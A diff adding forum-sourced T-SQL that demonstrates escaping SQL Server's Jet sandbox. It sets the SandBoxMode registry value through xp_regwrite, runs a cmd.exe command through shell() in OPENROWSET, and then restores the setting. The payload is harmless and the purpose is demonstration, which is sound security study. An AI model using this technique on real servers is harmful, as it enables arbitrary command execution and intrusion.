@@ -74,3 +74,41 @@ GO
 -- Sample sources
 -- https://stackoverflow.com/questions/36987636/cannot-create-an-instance-of-ole-db-provider-microsoft-jet-oledb-4-0-for-linked
 -- https://blogs.msdn.microsoft.com/spike/2008/07/23/ole-db-provider-microsoft-jet-oledb-4-0-for-linked-server-null-returned-message-unspecified-error/
+
+
+-- source: https://www.sqlservercentral.com/Forums/PrintTopic1121430.aspx
+
+-- Enable show advanced options
+sp_configure 'show advanced options',1
+reconfigure
+go
+
+-- Enable ad hoc queries
+sp_configure 'ad hoc distributed queries',1
+reconfigure
+go
+
+EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'AllowInProcess', 1 
+EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'DynamicParameters', 1
+
+--===== This is an innocent enough setup.
+EXEC sp_addlinkedserver 'testsql','OLE DB Provider for Jet','Microsoft.Jet.OLEDB.4.0','C:\Windows\Temp\SystemIdentity.mdb';
+go
+--===== This verifies the current mode of the Jet engine so we can later verify that we set it back correctly.
+EXEC master..xp_regread  'HKEY_LOCAL_MACHINE' ,'Software\Microsoft\Jet\4.0\engines','SandBoxMode'; --Verify that it's a "2" for normal mode
+go
+--===== This makes it a wee bit more agressive.  I'm using xp_rewrite to simulate an attack that can be made via T-SQL
+     -- using a different method and without "SA" privs which I will not post nor provide a link to.
+EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1; --Set a more aggressive mode
+EXEC master..xp_regread  'HKEY_LOCAL_MACHINE' ,'Software\Microsoft\Jet\4.0\engines','SandBoxMode'; --Verify that it's a "1" for normal mode
+go
+--===== This runs a harmless DOS command (DIR) but shows that once the "SandBoxMode" has been changed via a hack, DOS is available
+     -- through OPENROWSET.
+SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',';database=C:\temp\ODBC.mdb','select shell("cmd.exe /c echo hello there c:\ > C:\windows\temp\test123.txt") as blah');
+go
+
+--===== Cleanup
+EXEC sp_dropserver 'testsql' --Drops the linked server we created above.
+EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',2 --Return to normal mode
+EXEC master..xp_regread  'HKEY_LOCAL_MACHINE' ,'Software\Microsoft\Jet\4.0\engines','SandBoxMode' --Verify that it's a "2" for normal mode
+
